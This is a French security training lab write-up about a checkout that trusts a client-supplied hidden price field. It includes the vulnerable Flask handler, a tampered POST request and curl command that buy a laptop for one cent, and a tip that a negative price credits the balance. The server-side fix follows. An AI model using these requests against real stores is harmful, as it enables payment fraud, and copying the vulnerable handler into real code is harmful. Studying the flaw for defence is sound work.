Jour 4 / Lab 5

Prix contrôlé par le client dans le checkout

L’app TechStore affiche un catalogue avec des prix côté serveur, mais le formulaire « Buy » envoie le prix dans un champ caché et le backend lui fait confiance. Toute personne qui peut éditer la requête peut payer ce qu’elle veut.

Rappel rapide

Tout ce qui vient du navigateur est contrôlé par l’attaquant. Champs de formulaire, paramètres d’URL, inputs cachés, corps JSON — un input caché n’est caché que dans le rendu, pas dans la requête. Pour tout ce qui décide d’argent, de permissions ou d’état, la valeur doit être récupérée côté serveur depuis une source de confiance.

D’où vient la vulnérabilité

La page du shop rend chaque produit avec un formulaire qui inclut le prix dans un input caché.

<form method="post" action="/buy">
  <input type="hidden" name="product_name" value="Laptop Pro">
  <input type="hidden" name="price" value="1299.99">
  <button type="submit">Buy Now</button>
</form>

Le handler /buy lit le prix depuis le formulaire et le déduit directement du solde de l’utilisateur.

def buy():
    product_name = request.form['product_name']
    price = float(request.form['price'])

    user = conn.execute("SELECT * FROM users WHERE username=?", (session['username'],)).fetchone()

    if user['balance'] < price:
        return render_template('shop.html', error='Insufficient balance!')

    conn.execute("UPDATE users SET balance = balance - ? WHERE username=?", (price, session['username']))

Le nom du produit vient lui aussi du formulaire et est sauvegardé dans la table des commandes. C’est un autre problème d’intégrité — l’historique des commandes ne correspond plus au vrai catalogue — mais le bug d’argent est celui qui compte.

Comment fonctionne l’exploit

On part d’un compte frais (200 $ de solde) et on passe une commande normale pour voir à quoi ressemble la requête. Ensuite on rejoue la requête avec un prix modifié.

La requête normale

POST /buy
Cookie: session=<your-session>

product_name=Laptop+Pro&price=1299.99

La requête trafiquée

POST /buy
Cookie: session=<your-session>

product_name=Laptop+Pro&price=0.01

N’importe quel proxy fait l’affaire — Burp Repeater, le « Edit and resend » du devtools du navigateur, ou simplement curl :

curl -X POST http://localhost:5005/buy \
  -H "Cookie: session=<your-session>" \
  -d "product_name=Laptop Pro&price=0.01"

Le serveur déduit 0.01 et écrit une commande à ce prix. On visite /orders et le Laptop Pro apparaît payé un centime.

Pour aller plus loin

Un prix négatif crédite le compte. price=-500 transforme un « achat » en dépôt, ce qui est en général un finding plus parlant à démontrer parce que le solde augmente sans aucun paiement réel.

Correctif

Ne jamais prendre le prix depuis le client. Garder un catalogue côté serveur et chercher le prix par id de produit.

PRODUCTS = {
    1: {'name': 'USB Cable', 'price': 9.99},
    4: {'name': 'Gaming Monitor', 'price': 349.99},
    # ...
}

def buy():
    product_id = int(request.form['product_id'])
    product = PRODUCTS.get(product_id)
    if not product:
        return 'Unknown product', 400

    price = product['price']  # valeur de confiance
    name  = product['name']
    # ...puis on déduit le prix du solde...

Le formulaire ne transporte que l’id du produit. Tout ce qui détermine de l’argent est contrôlé par le serveur.

Le même principe s’applique à tout ce qui est sensible : rôle, limites de quantité, pourcentages de remise, pays d’expédition pour la TVA. Si la valeur décide quelque chose qui coûte de l’argent ou donne un accès, on la cherche côté serveur — on ne la prend pas du client.
